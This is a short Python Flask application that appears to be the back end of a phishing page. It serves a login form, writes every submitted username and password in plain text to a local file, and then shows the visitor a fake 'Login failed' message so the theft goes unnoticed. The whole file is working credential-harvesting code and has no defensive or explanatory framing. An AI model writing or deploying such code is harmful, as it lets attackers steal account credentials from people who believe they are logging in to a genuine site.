from flask import Flask, render_template, request

app = Flask(__name__)

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def capture():
    username = request.form.get('username')
    password = request.form.get('password')

    # Save credentials locally
    with open("credentials.txt", "a") as f:
        f.write(f"Username: {username}, Password: {password}\n")

    return "Login failed. Please try again."

if __name__ == '__main__':
    app.run(debug=True)